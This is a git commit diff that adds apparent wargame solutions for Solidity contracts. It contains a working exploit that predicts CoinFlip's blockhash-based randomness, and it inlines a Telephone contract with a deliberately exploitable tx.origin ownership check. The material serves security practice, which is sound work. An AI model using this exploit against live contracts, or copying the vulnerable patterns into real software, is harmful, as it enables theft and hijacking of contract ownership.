762e6ce76c174a334a62140e423c7b393b8ee386
apitoriadev <velezlaura15@gmail..com>
2022-11-26 19:38:15 -0500

    Contracts update up to level 6

--- 03CoinFlip.sol
+++ 03CoinFlip.sol
@@ -31,3 +31,26 @@ contract CoinFlip {
     }
   }
 }
+
+contract CoinFlipGuess {
+    // using SafeMath for uint256;
+    CoinFlip public cf;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _coinFlipContract) public{
+        cf = CoinFlip(_coinFlipContract);
+    }
+
+    function makeGuess() public returns(bool) {
+
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool guess = coinFlip == 1 ? true : false;
+        
+        return cf.flip(guess);
+    }
+
+    function checkBlockNumber() view public returns(uint) {
+        return block.number;
+    }
+}
--- 04Telephone.sol
+++ 04Telephone.sol
@@ -1,6 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-import "./Telephone.sol";
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
 
 contract SolveTelephone{
     
